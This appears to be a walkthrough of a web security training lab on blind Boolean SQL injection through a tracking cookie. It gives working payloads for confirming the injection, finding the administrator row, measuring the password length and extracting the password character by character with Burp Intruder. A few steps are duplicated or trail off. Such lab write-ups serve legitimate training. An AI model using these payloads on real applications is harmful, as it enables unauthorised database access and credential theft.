# Objective

Extract the administrator's password using only **True/False (Boolean)** responses.

The application behaves like this: 

- ✅ **Condition is TRUE** → "Welcome back" is shown.
- ❌ **Condition is FALSE** → "Welcome back" disappears.

This makes it possible to ask the database a series of yes/no questions.

---

# Step 1: Verify the Injection Point

Original cookie:

```
TrackingId=xyz
```

Modify it to:

```sql
TrackingId=xyz' AND 1=1--
```

### SQL Example

Suppose the application executes:

```sql
SELECT trackingid
FROM tracking
WHERE trackingid='xyz'
```

After injection:

```sql
SELECT trackingid
FROM tracking
WHERE trackingid='xyz'
AND '1'='1'
```

Since:

```sql
'1'='1'
```

is **TRUE**, the query still returns a row.

Result:

```
Welcome back
```

---

# Step 2: Test a False Condition

Now send:

```sql
TrackingId=xyz' AND 1=2--
```

The SQL becomes:

```sql
WHERE trackingid='xyz'
AND '1'='2'
```

Since:

```sql
'1'='2'
```

is **FALSE**, no row matches.

Result:

```
Welcome back disappears
```

This confirms that the application's response changes based on the truth of the injected condition.

---

# Step 3: Check Whether the `users` Table Exists

Payload:

```sql
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a'--
```

### Explanation

The subquery:

```sql
SELECT 'a'
FROM users
LIMIT 1
```

returns:

```
a
```

if the `users` table exists and contains at least one row.

The comparison:

```sql
'a'='a'
```

is **TRUE**, so "Welcome back" appears.

If the table didn't exist, the query would fail or evaluate as false.

---

# Step 4: Check Whether the `administrator` User Exists

Payload:

```sql
TrackingId=xyz' AND (SELECT username FROM users WHERE username='administrator')='administrator'--
```

If a row exists where:

And another payload:

Payload:

```sql
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a'--
```

If a row exists where:

```
username = administrator
```

the subquery returns:

```
a
```

Comparison:

```sql
'a'='a'
```

is **TRUE**.

So:

```
Welcome back
```

appears.

---

# Step 5: Determine the Password Length

Start with:

```sql
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator'
AND LENGTH(password)>1)='a'--
```

Suppose the password is:

```
k8m4z7...
```

with **20 characters**.

Then:

```sql
LENGTH(password)>1
```

is **TRUE**.

Continue increasing the number:

```sql
LENGTH(password)>2
```

```sql
LENGTH(password)>3
```

```sql
LENGTH(password)>4
```

...

Eventually:

```sql
LENGTH(password)>20
```

becomes:

```
20 > 20
```

which is **FALSE**.

At this point, "Welcome back" disappears.

From this you infer:

```
Password length = 20
```

---

# Step 6: Extract the Password One Character at a Time

Now use:

```sql
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--
```

### Explanation

Assume the password is:

```
m7g4x...
```

`SUBSTRING(password,1,1)` returns:

```
m
```

The condition becomes:

```sql
'm'='a'
```

which is **FALSE**.

So no "Welcome back".

---

Try:

```sql
'm'='b'
```

False.

---

Continue:

```sql
'm'='c'
```

False.

---

Eventually:

```sql
'm'='m'
```

becomes **TRUE**.

Now:

```
Welcome back
```

appears.

You have discovered:

```
Character 1 = m
```

---

# Step 7: Use Burp Intruder instead

Testing every character manually would be slow.

Instead:

1. Send the request to **Intruder**.
2. Highlight only the test character (for example, the final 1).
3. Click **Add §**.
4. Attack Type: Sniper

You get:

```
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator'
AND LENGTH(password)>**§**1**§**)='a'--

```

The `§...§` markers tell Intruder where to insert payloads.

---

# Step 8: Configure Payloads

Choose Payload type: Numbers

Add:

```

0
1
2
...
9
```

This covers digits.

1. Number Range: from- 1 to 25 & Step 1


<img width="1276" height="768" alt="Screenshot 2026-08-08 at 8 59 28 PM" src="https://github.com/user-attachments/assets/c550d829-e43c-4091-8201-360f254abff3" />
<img width="1278" height="768" alt="Screenshot 2026-08-08 at 8 59 07 PM" src="https://github.com/user-attachments/assets/a0933ebe-c2cc-403f-a0f2-26316dfb0384" />




# Step 9: Extract the Password

Now use:

```sql
**TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--**
```

---

# Step 10: Use Burp Intruder

Testing every character manually would be slow.

Instead:

1. Send the request to **Intruder**.
2. Highlight only the test character (for example, the final `a`).
3. Click **Add §**.
4. Attack Type: Cluster Bombs

You get:

```
**TrackingId=xyz' AND (SELECT SUBSTRING(password,**§**1**§**,1) FROM users WHERE username='administrator')='**§**a**§**'--**

```

The `§...§` markers tell Intruder where to insert payloads.

---

# Step 11: Configure Payloads

Payload 1-1: Numbers 1-25

Payload 1-a: Brute Force. (Max Length 1 & Min 1)

Add:

```
a
b
c
...
z
0
1
2
...
9
```

This covers lowercase letters and digits.

---

# Step 12: Grep for "Welcome back"

Configure **Grep - Match** with:

```
Welcome back
```

Password

```
t9e107uapbezcb55vl4y
```

Now every response is checked automatically.

Results look like:

| Payload | Welcome back |
| --- | --- |
| a | ❌ |
| b | ❌ |
| c | ❌ |
| ... | ... |
| m | ✅ |
| n | ❌ |

The row with the checkmark reveals the correct character.

---

# Step 13: Log In

---

Once all 20 characters are recovered:

1. Go to **My Account**.
2. Enter:

```
Username:
administrator
```

```
Password:
(recovered password)
```

1. Log in to complete the lab.
